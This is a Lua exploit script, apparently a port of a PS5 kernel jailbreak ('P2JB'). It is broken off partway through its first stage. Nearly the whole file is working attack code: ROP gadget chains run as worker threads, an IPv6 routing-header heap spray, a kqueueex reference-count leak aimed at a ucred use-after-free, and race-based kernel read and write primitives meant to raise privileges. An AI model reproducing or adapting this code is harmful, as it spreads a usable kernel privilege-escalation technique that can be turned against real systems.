-- P2JB port to Remote Lua Loader by maj0r
-- Credits:
-- p2jb.c by Gezine
-- p2jb.lua impl by cheburek3000
-- poops.lua (ps4) by egycnq

local UCRED_SIZE          = 360
local RTHDR_TAG           = 0x13370000
local MSG_IOV_NUM         = 23
local IOV_THREAD_NUM      = 4
local UIO_THREAD_NUM      = 4
local UIO_IOV_COUNT       = 20
local UIO_SYSSPACE        = 1
local TRIPLEFREE_ATTEMPTS = 8
local MAX_ROUNDS_TWIN     = 500
local MAX_ROUNDS_TRIPLET  = 500
local FIND_TRIPLET_FAST   = 5000
local TWIN_LOG_INTERVAL    = 250
local UMTX_OP_WAIT        = 2
local UMTX_OP_WAKE        = 3
local SYSTEM_AUTHID        = uint64("0x4800000000010003")
local U64_NEG1             = uint64("0xffffffffffffffff")
local U64_FILL             = uint64("0x4141414141414141")
local BAD_KQUEUEEX_NAME    = uint64("0x800000000000")


-- -----------------------------------------------------------------------------
-- cr_ref Wrap Plan
-- -----------------------------------------------------------------------------

local UINT32_MOD           = 4294967296
local INITIAL_CR_REF       = 1
local UAF_FILE_COUNT       = 0x10
local TWIN_ROUNDS_PER_FD   = MAX_ROUNDS_TWIN
local RECLAIM_CYCLES_BEFORE_CLOSE = 64
local TARGET_AFTER_OPEN    = 1
-- open("/dev/null") holders for old ucred refs
local HELD_FILE_PATH       = "/dev/null"
-- TARGET_BEFORE_OPEN + UAF_FILE_COUNT wraps back to TARGET_AFTER_OPEN.
local TARGET_BEFORE_OPEN   = UINT32_MOD - (UAF_FILE_COUNT - TARGET_AFTER_OPEN)
-- leak starts from INITIAL_CR_REF and must reach TARGET_BEFORE_OPEN.
local TARGET_CALLS         = TARGET_BEFORE_OPEN - INITIAL_CR_REF
local LEAK_WORKERS         = 4
local LEAK_WORKER_CORE     = 2
local LEAK_WORKER_RTPRIO   = 350
local LEAK_BATCH           = 16
local LEAK_TAIL_SLACK      = 0x100000
local LEAK_LOG_INTERVAL    = 1
local TAIL_BATCH           = 10000
local RLIMIT_KQUEUES       = 13
local RTP_SET              = 1
local RTP_PRIO_REALTIME    = 2
local CPU_LEVEL_WHICH      = 3
local CPU_WHICH_TID        = 1
local AF_UNIX              = rawget(_G, "AF_UNIX") or 1
local WORKER_WAIT_TIMEOUT_MS = 15000


-- -----------------------------------------------------------------------------
-- Lua Loader Runtime
-- -----------------------------------------------------------------------------

local malloc = memory.alloc
local read8  = function(addr) return memory.read_byte(addr):tonumber() end
local read32 = function(addr) return memory.read_dword(addr):tonumber() end
local read64 = function(addr)
    local v = memory.read_qword(addr)
    if v.h == 0 then return v:tonumber() end
    return v
end
local write8  = function(addr, value) memory.write_byte(addr, value) end
local write16 = function(addr, value) memory.write_word(addr, value) end
local write32 = function(addr, value) memory.write_dword(addr, value) end
local write64 = function(addr, value) memory.write_qword(addr, value) end
local to_hex = rawget(_G, "to_hex") or function(v) return hex(v) end

local function to_num(v)
    if type(v) == "table" and v.tonumber then
        return v:tonumber()
    end
    return tonumber(v)
end

local function is_kptr(v)
    return v ~= nil and v ~= 0 and bit64.rshift(v, 48):tonumber() == 0xffff
end

local function u32(v)
    v = v % UINT32_MOD
    if v < 0 then v = v + UINT32_MOD end
    return v
end

local function cr_ref_estimate(calls)
    return u32(INITIAL_CR_REF + calls)
end

local function fmt_u32(v)
    return string.format("0x%08x", u32(v))
end

local function format_eta(seconds)
    if not seconds or seconds < 0 then seconds = 0 end
    seconds = math.floor(seconds + 0.5)
    local h = math.floor(seconds / 3600)
    local m = math.floor((seconds % 3600) / 60)
    local s = seconds % 60
    return string.format("ETA: %dh %dm %ds", h, m, s)
end

local function assert_no_unexpected_wrap(phase, prev_ref, next_ref)
    if next_ref < prev_ref then
        error(string.format("%s unexpected cr_ref wrap prev=%s next=%s",
            phase, fmt_u32(prev_ref), fmt_u32(next_ref)))
    end
end

local function platform_is(name)
    return string.lower(tostring(PLATFORM or "")) == name
end

local function klog(s)
    print("[*] " .. tostring(s))
end

local function elog(s)
    print("[-] " .. tostring(s))
end

local function stage_notify(s)
    send_ps_notification(s)
end

local function require_gadget(name)
    local g = gadgets and gadgets[name]
    if not g then
        error("missing gadget: " .. name)
    end
    return g
end


-- -----------------------------------------------------------------------------
-- ROP Gadgets
-- -----------------------------------------------------------------------------

local RET                     = require_gadget("ret")
local POP_RSP_RET             = require_gadget("pop rsp; ret")
local POP_RAX_RET             = require_gadget("pop rax; ret")
local POP_RBX_RET             = require_gadget("pop rbx; ret")
local POP_RCX_RET             = require_gadget("pop rcx; ret")
local POP_RDX_RET             = require_gadget("pop rdx; ret")
local POP_RDI_RET             = require_gadget("pop rdi; ret")
local POP_RSI_RET             = require_gadget("pop rsi; ret")
local POP_R8_RET              = require_gadget("pop r8; ret")
local MOV_RAX_DEREF_RAX_RET   = require_gadget("mov rax, [rax]; ret")
local MOV_DEREF_RDI_RAX_RET   = require_gadget("mov [rdi], rax; ret")


-- -----------------------------------------------------------------------------
-- Worker/Thread Helpers
-- -----------------------------------------------------------------------------

-- Syscall wrapper helper
local function get_syscall_wrapper(num)
    if platform_is("ps4") then
        return syscall.syscall_wrapper[num]
    else
        return syscall.syscall_address
    end
end

local function pin_to_core(core)
    local mask = malloc(0x10)
    for i = 0, 15 do write8(mask + i, 0) end
    write16(mask, bit32.lshift(1, core))
    return to_num(syscall.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, U64_NEG1, 0x10, mask))
end

local function set_rtprio(prio)
    local rt = malloc(0x4)
    write16(rt, RTP_PRIO_REALTIME)
    write16(rt + 2, prio)
    return to_num(syscall.rtprio_thread(RTP_SET, 0, rt))
end

local function rop_pin_to_core(chain, core)
    local mask = malloc(0x10)
    for i = 0, 15 do write8(mask + i, 0) end
    write16(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, U64_NEG1, 0x10, mask)
end

local function rop_set_rtprio(chain, prio)
    local rt = malloc(0x4)
    write16(rt, RTP_PRIO_REALTIME)
    write16(rt + 2, prio)
    chain:push_syscall(syscall.rtprio_thread, RTP_SET, 0, rt)
end

local function spawn_kqueueex_leaker(worker_id, stop_addr, counter_addr)
    local chain = ropchain({ stack_size = 0x4000 })
    rop_pin_to_core(chain, LEAK_WORKER_CORE + worker_id - 1)
    rop_set_rtprio(chain, LEAK_WORKER_RTPRIO)
    chain:gen_loop(stop_addr, "==", 0, function()
        for _ = 1, LEAK_BATCH do
            chain:push_syscall(syscall.kqueueex, BAD_KQUEUEEX_NAME)
        end
        chain:push_add_atomic_qword(counter_addr, LEAK_BATCH)
    end)
    local t = thread:new(chain)
    t:run(true)
    return t
end

local function create_worker_sync(count)
    local raw = malloc(8 + count * 8 + 128)
    local raw_num = to_num(raw)
    local aligned = raw + ((64 - (raw_num % 64)) % 64)
    write64(aligned, 0)
    for i = 0, count - 1 do write64(aligned + 0x08 + i * 8, 0) end
    return { cmd = aligned, finished = aligned + 0x08, total = count, gen = 0 }
end

local function signal_workers(ws)
    for i = 0, ws.total - 1 do write64(ws.finished + i * 8, 0) end
    ws.gen = ws.gen + 1
    write64(ws.cmd, ws.gen)
    syscall.umtx_op(ws.cmd, UMTX_OP_WAKE, 0x7FFFFFFF, 0, 0)
end

local function wait_workers(ws, timeout_ms, label)
    timeout_ms = timeout_ms or WORKER_WAIT_TIMEOUT_MS
    label = label or "worker"
    local elapsed = 0
    while true do
        local done = true
        for i = 0, ws.total - 1 do
            if read64(ws.finished + i * 8) == 0 then done = false; break end
        end
        if done then return end
        if elapsed >= timeout_ms then
            error("wait timeout: " .. tostring(label))
        end
        sleep(1, "ms")
        elapsed = elapsed + 1
        syscall.sched_yield()
    end
end

local function spawn_rop_worker(ws, wid, name, fd, iov_ptr, sysnum, wrapper, scratch)
    local cb = malloc(0x8000)
    local cb_num = to_num(cb)
    cb = cb + ((16 - (cb_num % 16)) % 16)
    local idx = 0
    local function p(v) write64(cb + idx * 8, v); idx = idx + 1 end

    p(RET); p(POP_RBX_RET); p(scratch)

    -- keep worker bootstrap minimal for loader stability

    -- main loop: wait on umtx, execute syscall, signal done
    local loop_start = idx
    p(POP_RBX_RET); p(scratch)
    p(POP_RDI_RET); p(ws.cmd); p(POP_RSI_RET); p(UMTX_OP_WAIT)
    local wait_val_slot = idx
    p(POP_RDX_RET); p(0); p(POP_RCX_RET); p(0)
    p(POP_R8_RET); p(0)
    p(POP_RAX_RET); p(0x1c6); p(get_syscall_wrapper(0x1c6))

    p(POP_RAX_RET); p(ws.cmd); p(MOV_RAX_DEREF_RAX_RET)
    p(POP_RDI_RET); p(cb + (wait_val_slot + 1) * 8); p(MOV_DEREF_RDI_RAX_RET)

    -- issue the actual work syscall
    p(POP_RDI_RET); p(fd); p(POP_RSI_RET); p(iov_ptr)
    local iov_count = sysnum == 0x1B and 0 or UIO_IOV_COUNT
    local slot_pop_rdx = idx; p(POP_RDX_RET)
    local slot_count   = idx; p(iov_count)
    local slot_pop_rax = idx; p(POP_RAX_RET)
    local slot_sysnum  = idx; p(sysnum)
    local slot_wrapper = idx; p(wrapper)

    -- signal finished
    local emit_wf = function(addr, val)
        p(POP_RAX_RET); p(val); p(POP_RDI_RET); p(addr); p(MOV_DEREF_RDI_RAX_RET)
    end
    emit_wf(ws.finished + wid * 8, 1)

    -- wake main thread
    p(POP_RBX_RET); p(scratch)
    p(POP_RDI_RET); p(ws.finished + wid * 8); p(POP_RSI_RET); p(UMTX_OP_WAKE)
    p(POP_RDX_RET); p(0x7FFFFFFF); p(POP_RCX_RET); p(0)
    p(POP_R8_RET); p(0)
    p(POP_RAX_RET); p(0x1c6); p(get_syscall_wrapper(0x1c6))

    -- self-repair clobbered slots (ps5 recvmsg EFAULT)
    p(POP_RDI_RET); p(cb + slot_pop_rdx * 8); p(POP_RAX_RET); p(POP_RDX_RET); p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_count * 8);   p(POP_RAX_RET); p(iov_count);   p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_pop_rax * 8); p(POP_RAX_RET); p(POP_RAX_RET); p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_sysnum * 8);  p(POP_RAX_RET); p(sysnum);      p(MOV_DEREF_RDI_RAX_RET)
    p(POP_RDI_RET); p(cb + slot_wrapper * 8); p(POP_RAX_RET); p(wrapper);      p(MOV_DEREF_RDI_RAX_RET)

    p(POP_RSP_RET); p(cb + loop_start * 8)

    -- launch via siglongjmp
    local jb = malloc(0x60)
    for i = 0, 0x58, 8 do write64(jb + i, 0) end
    write64(jb, RET)
    write64(jb + 0x10, cb)
    if not thread.initialized then thread.init() end
    write32(jb + 0x40, thread.fpu_ctrl_value)
    write32(jb + 0x44, thread.mxcsr_value)

    local fThrdCreate = fcall(libc_addrofs.Thrd_create)
    local th = malloc(8); write64(th, 0)
    local ret = to_num(fThrdCreate(th, libc_addrofs.longjmp, jb))
    if ret ~= 0 then
        error("Thrd_create worker " .. tostring(name) .. " failed: " .. tostring(ret))
    end
end


local function build_rthdr(buf, target_size)
    local segments = bit32.band(math.floor(target_size / 8) - 1, 0xFFFFFFFE)
    write8(buf, 0)
    write8(buf + 1, segments)
    write8(buf + 2, 0)
    write8(buf + 3, bit32.rshift(segments, 1))
    return (segments + 1) * 8
end


-- -----------------------------------------------------------------------------
-- Firmware Offsets + Environment Checks
-- -----------------------------------------------------------------------------

local function resolve_kqueueex_offsets()
    if type(get_offsets) == "function" then
        local off = get_offsets(tostring(FW_VERSION))
        if off then return off end
    end

    local ko = rawget(_G, "kernel_offset")
    if type(ko) ~= "table" then
        return nil
    end

    return {
        KQ_FDP              = 0xA8,
        PIPE_SIGIO          = 0xD8,
        INPCB_PKTOPTS       = ko.INPCB_PKTOPTS or 0x120,
        IP6PO_RTHDR         = 0x70,
        FILEDESC_OFILES     = ko.FILEDESC_OFILES or 0x08,
        FDESCENTTBL_HDR     = 0x08,
        FILEDESCENT_SIZE    = ko.SIZEOF_OFILES or 0x30,
        PROC_PID            = ko.PROC_PID or 0xBC,
        PROC_UCRED          = 0x40,
        PROC_FD             = ko.PROC_FD or 0x48,
        FD_RDIR             = 0x10,
        FD_JDIR             = 0x18,
        UCRED_CR_UID        = 0x04,
        UCRED_CR_RUID       = 0x08,
        UCRED_CR_SVUID      = 0x0C,
        UCRED_CR_NGROUPS    = 0x10,
        UCRED_CR_RGID       = 0x14,
        UCRED_CR_SCEAUTHID  = 0x58,
        UCRED_CR_SCECAPS0   = 0x60,
        UCRED_CR_SCECAPS1   = 0x68,
        SECURITY_FLAGS      = ko.DATA_BASE_SECURITY_FLAGS,
        TARGET_ID_REL       = 0x09,
        QA_FLAGS_REL        = 0x24,
    }
end



-- -----------------------------------------------------------------------------
-- Main Payload
-- -----------------------------------------------------------------------------

function p2jb()
    local OFF = resolve_kqueueex_offsets()
    if not OFF then
        klog("[init] missing savedata0 kernel_offset/get_offsets")
        stage_notify("Missing savedata0 kernel offsets")
        return
    end
    if not OFF.SECURITY_FLAGS then
        klog("[init] missing SECURITY_FLAGS offset for fw " .. tostring(FW_VERSION))
        stage_notify("Missing fw offsets " .. tostring(FW_VERSION))
        return
    end
    
    if not platform_is("ps5") then
        stage_notify("Unsupported platform: " .. tostring(PLATFORM))
        return
    end

    local fw_num = tonumber(FW_VERSION) or 0
    if fw_num == 0 then
        stage_notify("Unknown FW version")
        return
    end
    if fw_num > 12.70 then
        stage_notify("Unsupported FW: " .. tostring(FW_VERSION))
        return
    end

    if is_jailbroken() then
        stage_notify("Already Jailbroken")
        return
    end

    local UMTX_OP_SYSNUM = 0x1c6

    syscall.resolve({
        read = 0x3, write = 0x4, open = 0x5, close = 0x6, pipe = 0x2a,
        mmap = 0x1dd, mprotect = 0x4a, dlsym = 0x24f,
        jitshm_create = 0x215, jitshm_alias = 0x216,
        dynlib_load_prx = 0x252, is_in_sandbox = 0x249, getuid = 0x18,
        setuid = 0x17, sched_yield = 0x14B, setrlimit = 0xC3,
        recvmsg = 0x1B, cpuset_setaffinity = 0x1E8, rtprio_thread = 0x1D2,
        sendto = 0x85, fcntl = 0x5C, kqueue = 0x16A, kqueueex = 0x8D,
        readv = 0x78, writev = 0x79, getpid = 0x14, nmount = 0x17A,
        ioctl = 0x36, socket = 0x61, socketpair = 0x87,
        setsockopt = 0x69, getsockopt = 0x76, nanosleep = 0xF0,
        umtx_op = UMTX_OP_SYSNUM,
    })

    local writable_path = rawget(_G, "WRITABLE_PATH") or "/av_contents/content_tmp/"
    local failcheck_path = writable_path .. "kqueueex.fail"
    if file_exists(failcheck_path) then
        stage_notify("Restart your PS5 to run exploit again");
        return
    end
    
    local function create_socket(domain, typ, protocol)
        return to_num(syscall.socket(domain, typ, protocol))
    end

    -- syscall wrappers for ROP chains
    local w_recvmsg = get_syscall_wrapper(0x1B)
    local w_readv   = get_syscall_wrapper(0x78)
    local w_writev  = get_syscall_wrapper(0x79)

    local scratch     = malloc(16)
    local scratch_big = malloc(0x4000)
    for i = 0, 56, 8 do write64(scratch_big + i, 0) end

    local dummy_byte     = malloc(8)
    local len_out        = malloc(4)
    local rthdr_readback = malloc(360)
    for i = 0, 248, 8 do write64(rthdr_readback + i, 0) end

    local DELAY_SHORT  = malloc(16); write64(DELAY_SHORT, 0);  write64(DELAY_SHORT + 8, 10000000)
    local DELAY_MEDIUM = malloc(16); write64(DELAY_MEDIUM, 0); write64(DELAY_MEDIUM + 8, 500000000)
    local DELAY_SETTLE = malloc(16); write64(DELAY_SETTLE, 0); write64(DELAY_SETTLE + 8, 100000000)

    -- cpu pinning
    local cpu_mask = malloc(16)
    for i = 0, 15 do write8(cpu_mask + i, 0) end
    write16(cpu_mask, 0x10)
    syscall.cpuset_setaffinity(3, 1, U64_NEG1, 16, cpu_mask)
    local rt_params = malloc(4)
    write16(rt_params, 2); write16(rt_params + 2, 256)
    syscall.rtprio_thread(1, 0, rt_params)

    -- socket pairs for worker communication

    local function create_pipe_pair()
        local rfd, wfd = create_pipe()
        return rfd, wfd
    end

    local uio_sv = malloc(8); syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sv)
    local uio_sock_a = read32(uio_sv)
    local uio_sock_b = read32(uio_sv + 4)

    local iov_sv = malloc(8); syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sv)
    local iov_sock_a = read32(iov_sv)
    local iov_sock_b = read32(iov_sv + 4)

    -- Worker iovec/uio buffers

    local recvmsg_iovecs = malloc(MSG_IOV_NUM * 16)
    for i = 0, MSG_IOV_NUM * 16 - 1, 8 do write64(recvmsg_iovecs + i, 0) end
    write64(recvmsg_iovecs, 1); write64(recvmsg_iovecs + 8, 1)

    local recvmsg_hdr = malloc(0x38)
    for i = 0, 0x30, 8 do write64(recvmsg_hdr + i, 0) end
    write64(recvmsg_hdr + 0x10, recvmsg_iovecs)
    write64(recvmsg_hdr + 0x18, MSG_IOV_NUM)

    local uio_read_buf = malloc(64)
    for i = 0, 56, 8 do write64(uio_read_buf + i, U64_FILL) end
    local uio_write_buf = malloc(64)
    for i = 0, 56, 8 do write64(uio_write_buf + i, 0) end

    local uio_iov_read = malloc(UIO_IOV_COUNT * 16)
    for i = 0, UIO_IOV_COUNT * 16 - 1, 8 do write64(uio_iov_read + i, 0) end
    write64(uio_iov_read, uio_read_buf); write64(uio_iov_read + 8, 8)

    local uio_iov_write = malloc(UIO_IOV_COUNT * 16)
    for i = 0, UIO_IOV_COUNT * 16 - 1, 8 do write64(uio_iov_write + i, 0) end
    write64(uio_iov_write, uio_write_buf); write64(uio_iov_write + 8, 8)

    local kread_result_bufs = {}
    for i = 1, UIO_THREAD_NUM do kread_result_bufs[i] = malloc(64) end
    local kread_sndbuf = malloc(4)
    local kwrite_sndbuf = malloc(4)

    -- pipe pairs for kernel r/w primitive

    local master_rfd, master_wfd = create_pipe_pair()
    local victim_rfd, victim_wfd = create_pipe_pair()
    syscall.fcntl(master_rfd, 4, 4); syscall.fcntl(master_wfd, 4, 4)
    syscall.fcntl(victim_rfd, 4, 4); syscall.fcntl(victim_wfd, 4, 4)
    klog("pipes master=" .. master_rfd .. "," .. master_wfd .. " victim=" .. victim_rfd .. "," .. victim_wfd)

    -- Worker thread setup

    local iov_workers       = create_worker_sync(IOV_THREAD_NUM)
    local uio_read_workers  = create_worker_sync(UIO_THREAD_NUM)
    local uio_write_workers = create_worker_sync(UIO_THREAD_NUM)
    klog("worker sync ready")

    klog("spawning iov workers")
    for i = 1, IOV_THREAD_NUM do
        spawn_rop_worker(iov_workers, i - 1, "iov" .. i,
            iov_sock_a, recvmsg_hdr, 0x1B, w_recvmsg,
            scratch)
    end
    klog("iov workers ready")

    klog("spawning uio read workers")
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_read_workers, i - 1, "uior" .. i,
            uio_sock_b, uio_iov_read, 0x79, w_writev,
            scratch)
    end
    klog("uio read workers ready")

    klog("spawning uio write workers")
    for i = 1, UIO_THREAD_NUM do
        spawn_rop_worker(uio_write_workers, i - 1, "uiow" .. i,
            uio_sock_a, uio_iov_write, 0x78, w_readv,
            scratch)
    end
    klog("uio write workers ready")

    local active_uio_mode = 0

    local function signal_iov()  signal_workers(iov_workers) end
    local function wait_iov()    wait_workers(iov_workers, WORKER_WAIT_TIMEOUT_MS, "iov") end

    local function signal_uio(mode)
        active_uio_mode = mode
        if mode == 0 then signal_workers(uio_read_workers) else signal_workers(uio_write_workers) end
    end
    local function wait_uio()
        if active_uio_mode == 0 then
            wait_workers(uio_read_workers, WORKER_WAIT_TIMEOUT_MS, "uio-read")
        else
            wait_workers(uio_write_workers, WORKER_WAIT_TIMEOUT_MS, "uio-write")
        end
    end

    -- IPv6 rthdr spray

    local ipv6_sockets = {}
    local ipv6_count = 0
    for i = 1, 64 do
        local fd = create_socket(AF_INET6, SOCK_STREAM, 0)
        if fd < 0 then break end
        ipv6_sockets[i] = fd
        ipv6_count = i
    end
    for i = 1, ipv6_count do
        syscall.setsockopt(ipv6_sockets[i], IPPROTO_IPV6, 51, 0, 0)
    end
    syscall.nanosleep(DELAY_MEDIUM, 0)

    local rthdr_spray = malloc(UCRED_SIZE)
    for i = 0, UCRED_SIZE - 1, 8 do write64(rthdr_spray + i, 0) end
    local rthdr_spray_len = build_rthdr(rthdr_spray, UCRED_SIZE)

    local function set_rthdr(sock, buf, len)
        return to_num(syscall.setsockopt(sock, IPPROTO_IPV6, 51, buf, len))
    end
    local function get_rthdr(sock, buf, len_ptr)
        return to_num(syscall.getsockopt(sock, IPPROTO_IPV6, 51, buf, len_ptr))
    end
    local function free_rthdr(sock)
        return to_num(syscall.setsockopt(sock, IPPROTO_IPV6, 51, 0, 0))
    end

    local tag_buf = malloc(16)
    local tag_len = malloc(4)

    local function find_twins(max_rounds, log_label)
        for round = 1, max_rounds do
            for i = 0, ipv6_count - 1 do
                write32(rthdr_spray + 4, RTHDR_TAG + i)
                set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
            end
            for i = 0, ipv6_count - 1 do
                write32(tag_len, 8)
                if get_rthdr(ipv6_sockets[i + 1], tag_buf, tag_len) >= 0 then
                    local val = read32(tag_buf + 4)
                    local j = bit32.band(val, 0xFFFF)
                    if bit32.band(val, 0xFFFF0000) == RTHDR_TAG and i ~= j and j < ipv6_count then
                        return { i, j }
                    end
                end
            end
            if log_label and round % TWIN_LOG_INTERVAL == 0 then
                klog("[0] twin search " .. log_label .. " round="
                    .. tostring(round) .. "/" .. tostring(max_rounds))
            end
            if round % 50 == 0 then syscall.sched_yield() end
        end
        return nil
    end

    local function find_triplet(master_idx, exclude_idx, max_rounds)
        for round = 1, max_rounds do
            for i = 0, ipv6_count - 1 do
                if i ~= master_idx and i ~= exclude_idx then
                    write32(rthdr_spray + 4, RTHDR_TAG + i)
                    set_rthdr(ipv6_sockets[i + 1], rthdr_spray, rthdr_spray_len)
                end
            end
            write32(tag_len, 8)
            if get_rthdr(ipv6_sockets[master_idx + 1], tag_buf, tag_len) >= 0 then
                local val = read32(tag_buf + 4)
                local j = bit32.band(val, 0xFFFF)
                if bit32.band(val, 0xFFFF0000) == RTHDR_TAG and j ~= master_idx and j ~= exclude_idx and j < ipv6_count then
                    return j
                end
            end
            if round % 100 == 0 then syscall.sched_yield() end
        end
        return -1
    end

    -- Triplet state management

    local triplets = { -1, -1, -1 }

    local function triplets_valid()
        return triplets[1] >= 0 and triplets[2] >= 0 and triplets[3] >= 0
            and triplets[2] < ipv6_count and triplets[3] < ipv6_count
    end

    local function repair_triplets()
        if triplets[2] < 0 or triplets[2] >= ipv6_count then
            for attempt = 1, 5 do
                triplets[2] = find_triplet(triplets[1], triplets[3], FIND_TRIPLET_FAST)
                if triplets[2] ~= -1 then break end
                syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
            end
        end
        if triplets[3] < 0 or triplets[3] >= ipv6_count then
            for attempt = 1, 5 do
                triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
                if triplets[3] ~= -1 then break end
                syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
            end
        end
        return triplets_valid()
    end

    -- slow kernel r/w (via uio/iov race)

    local function build_uio(buf, iov_ptr, td, is_read, kaddr, size)
        write64(buf,      iov_ptr)
        write64(buf + 8,  UIO_IOV_COUNT)
        write64(buf + 16, U64_NEG1)
        write64(buf + 24, size)
        write32(buf + 32, UIO_SYSSPACE)
        write32(buf + 36, is_read and 1 or 0)
        write64(buf + 40, td)
        write64(buf + 48, kaddr)
        write64(buf + 56, size)
    end

    local function kread_slow(kaddr, size)
        if not triplets_valid() then return nil end

        for i = 0, 56, 8 do write64(uio_read_buf + i, U64_FILL) end
        for i = 1, UIO_THREAD_NUM do
            for j = 0, size - 1 do write8(kread_result_bufs[i] + j, 0) end
        end

        write32(kread_sndbuf, size)
        syscall.setsockopt(uio_sock_b, SOL_SOCKET, 0x1001, kread_sndbuf, 4)
        syscall.write(uio_sock_b, scratch_big, size)
        write64(uio_iov_read + 8, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_sockets[triplets[2] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local uio_iters = 0
        while true do
            signal_uio(0); syscall.sched_yield()
            write32(len_out, 16)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 8) == UIO_IOV_COUNT then break end
            syscall.read(uio_sock_a, scratch_big, size)
            for i = 1, UIO_THREAD_NUM do syscall.read(uio_sock_a, kread_result_bufs[i], size) end
            wait_uio()
            syscall.write(uio_sock_b, scratch_big, size)
            uio_iters = uio_iters + 1
            if uio_iters > 2000 then return nil end
        end

        local leaked_iov = read64(rthdr_readback)
        if not is_kptr(leaked_iov) then return nil end

        build_uio(recvmsg_iovecs, leaked_iov, 0, true, kaddr, size)

        if not triplets_valid() then return nil end
        free_rthdr(ipv6_sockets[triplets[3] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local iov_iters = 0
        while true do
            signal_iov()
            for _ = 1, 5 do syscall.sched_yield() end
            write32(len_out, 64)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 32) == UIO_SYSSPACE then break end
            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return nil end
        end

        syscall.read(uio_sock_a, scratch_big, size)
        local result = nil
        for i = 1, UIO_THREAD_NUM do
            syscall.read(uio_sock_a, kread_result_bufs[i], size)
            local v = read64(kread_result_bufs[i])
            if v ~= U64_FILL then
                local t = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
                if t == -1 then
                    wait_uio()
                    syscall.write(iov_sock_b, scratch_big, 1)
                    wait_iov()
                    syscall.read(iov_sock_a, dummy_byte, 1)
                    triplets[2] = find_triplet(triplets[1], triplets[3], FIND_TRIPLET_FAST)
                    return nil
                end
                triplets[2] = t
                result = kread_result_bufs[i]
            end
        end
        wait_uio()
        syscall.write(iov_sock_b, scratch_big, 1)

        if not result then
            wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
            return nil
        end

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[3] == -1 then
            wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
            return nil
        end

        wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
        return result
    end

    local function kwrite_slow(kaddr, data, data_size)
        if not triplets_valid() then return false end

        write32(kwrite_sndbuf, data_size)
        syscall.setsockopt(uio_sock_b, SOL_SOCKET, 0x1001, kwrite_sndbuf, 4)
        write64(uio_iov_write + 8, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_sockets[triplets[2] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local uio_iters = 0
        while true do
            signal_uio(1); syscall.sched_yield()
            write32(len_out, 16)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 8) == UIO_IOV_COUNT then break end
            for i = 1, UIO_THREAD_NUM do syscall.write(uio_sock_b, data, data_size) end
            wait_uio()
            uio_iters = uio_iters + 1
            if uio_iters > 2000 then return false end
        end

        local leaked_iov = read64(rthdr_readback)
        if not is_kptr(leaked_iov) then return false end

        build_uio(recvmsg_iovecs, leaked_iov, 0, false, kaddr, data_size)

        if not triplets_valid() then return false end
        free_rthdr(ipv6_sockets[triplets[3] + 1])
        syscall.sched_yield(); syscall.sched_yield(); syscall.sched_yield()

        local iov_iters = 0
        while true do
            signal_iov()
            for _ = 1, 5 do syscall.sched_yield() end
            write32(len_out, 64)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)
            if read32(rthdr_readback + 32) == UIO_SYSSPACE then break end
            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
            iov_iters = iov_iters + 1
            if iov_iters > 2000 then return false end
        end

        for i = 1, UIO_THREAD_NUM do syscall.write(uio_sock_b, data, data_size) end

        for attempt = 1, 5 do
            triplets[2] = find_triplet(triplets[1], -1, FIND_TRIPLET_FAST)
            if triplets[2] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[2] == -1 then return false end

        wait_uio()
        syscall.write(iov_sock_b, scratch_big, 1)

        for attempt = 1, 5 do
            triplets[3] = find_triplet(triplets[1], triplets[2], FIND_TRIPLET_FAST)
            if triplets[3] ~= -1 then break end
            syscall.sched_yield()
        end
        if triplets[3] == -1 then return false end

        wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
        return true
    end

    local function kslow64(kaddr)
        for attempt = 1, 3 do
            if triplets_valid() then
                local buf = kread_slow(kaddr, 8)
                if buf then
                    local val = read64(buf)
                    if val ~= 0 then
                        if bit64.rshift(val, 48):tonumber() == 0xFFFF then return val end
                        if bit64.rshift(val, 40):tonumber() ~= 0 then return val end
                    end
                end
            end
            repair_triplets(); syscall.sched_yield()
        end
        return nil
    end

    -- -------------------------------------------------------------------------
    -- Stage 0: Kqueueex cr_ref Leak -> Ucred Triplet
    -- -------------------------------------------------------------------------
    stage_notify("Stage 0\nKqueueex cr_ref leak")
    local uaf_socket = -1
    local held_fds = {}
    local race_success = false

    local function disable_kqueue_limit()
        local rlp = malloc(0x10)
        write64(rlp, U64_NEG1)
        write64(rlp + 8, U64_NEG1)
